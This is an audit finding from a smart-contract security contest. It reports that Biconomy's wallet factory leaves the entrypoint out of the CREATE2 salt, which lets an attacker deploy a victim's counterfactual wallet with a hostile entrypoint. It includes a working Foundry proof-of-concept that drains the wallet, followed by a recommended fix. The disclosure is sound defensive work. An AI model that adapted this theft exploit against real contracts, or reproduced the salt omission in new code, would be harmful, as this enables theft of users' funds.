## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-03

# [Attacker can gain control of counterfactual wallet](https://github.com/code-423n4/2023-01-biconomy-findings/issues/460) 

# Lines of code

https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45


# Vulnerability details

A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.

However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:

https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45

```solidity
function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){
    bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));
    bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));
    // solhint-disable-next-line no-inline-assembly
    assembly {
        proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
    }
    require(address(proxy) != address(0), "Create2 call failed");
    // EOA + Version tracking
    emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);
    BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);
    isAccountExist[proxy] = true;
}
```

As the entrypoint address doesn't take any role in the address generation (it isn't part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.

## Impact

After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using `delegatecall`) using the `execFromEntryPoint` function:

https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492

```solidity
function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        
    success = execute(dest, value, func, operation, gasLimit);
    require(success, "Userop Failed");
}
```

This means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.

## PoC

In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet.

```solidity
contract StealEntryPoint {
    function steal(SmartAccount wallet) public {
        uint256 balance = address(wallet).balance;

        wallet.execFromEntryPoint(
            msg.sender, // address dest
            balance, // uint value
            "", // bytes calldata func
            Enum.Operation.Call, // Enum.Operation operation
            gasleft() // uint256 gasLimit
        );
    }
}

contract AuditTest is Test {
    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;

    uint256 bobPrivateKey = 0x123;
    uint256 attackerPrivateKey = 0x456;

    address deployer;
    address bob;
    address attacker;
    address entrypoint;
    address handler;

    SmartAccount public implementation;
    SmartAccountFactory public factory;
    MockToken public token;

    function setUp() public {
        deployer = makeAddr("deployer");
        bob = vm.addr(bobPrivateKey);
        attacker = vm.addr(attackerPrivateKey);
        entrypoint = makeAddr("entrypoint");
        handler = makeAddr("handler");

        vm.label(deployer, "deployer");
        vm.label(bob, "bob");
        vm.label(attacker, "attacker");

        vm.startPrank(deployer);
        implementation = new SmartAccount();
        factory = new SmartAccountFactory(address(implementation));
        token = new MockToken();
        vm.stopPrank();
    }
    
    function test_SmartAccountFactory_StealCounterfactualWallet() public {
        uint256 index = 0;
        address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);
        // Simulate Bob sends 1 ETH to the wallet
        uint256 amount = 1 ether;
        vm.deal(counterfactualWallet, amount);

        // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)
        vm.startPrank(attacker);

        StealEntryPoint stealer = new StealEntryPoint();

        address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);
        SmartAccount wallet = SmartAccount(payable(proxy));

        // address is the same
        assertEq(address(wallet), counterfactualWallet);

        // trigger attack
        stealer.steal(wallet);

        vm.stopPrank();

        // Attacker has stolen the funds
        assertEq(address(wallet).balance, 0);
        assertEq(attacker.balance, amount);
    }
}
```

## Recommendation

This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.